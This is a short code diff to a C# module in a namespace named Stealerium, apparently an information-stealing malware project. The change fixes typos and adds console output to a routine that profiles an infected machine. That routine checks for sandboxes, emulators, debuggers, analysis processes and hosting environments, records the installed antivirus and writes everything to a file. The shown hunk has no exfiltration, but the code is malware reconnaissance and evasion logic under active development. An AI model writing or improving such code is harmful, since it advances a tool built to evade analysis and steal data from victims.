@@ -34,15 +34,20 @@ namespace Stealerium.Target.System
                                      + "\nSandBoxie: " + AntiAnalysis.SandBox()
                                      + "\nEmulator: " + AntiAnalysis.Emulator()
                                      + "\nDebugger: " + AntiAnalysis.Debugger()
-                                     + "\nProcesse: " + AntiAnalysis.Processes()
+                                     + "\nProcesses: " + AntiAnalysis.Processes()
                                      + "\nHosting: " + AntiAnalysis.HostingAsync()
                                      + "\nAntivirus: " + SystemInfo.GetAntivirus()
                                      + "\n";
+
+                // Output the system info to the console
+                Console.WriteLine(systemInfoText);
+
+                // Save the system info to a file
                 File.WriteAllText(sSavePath, systemInfoText);
             }
             catch (Exception ex)
             {
-                Logging.Log("SysInfo >> Failed fetch system info\n" + ex);
+                Logging.Log("SysInfo >> Failed to fetch system info\n" + ex.Message);
             }
         }
     }
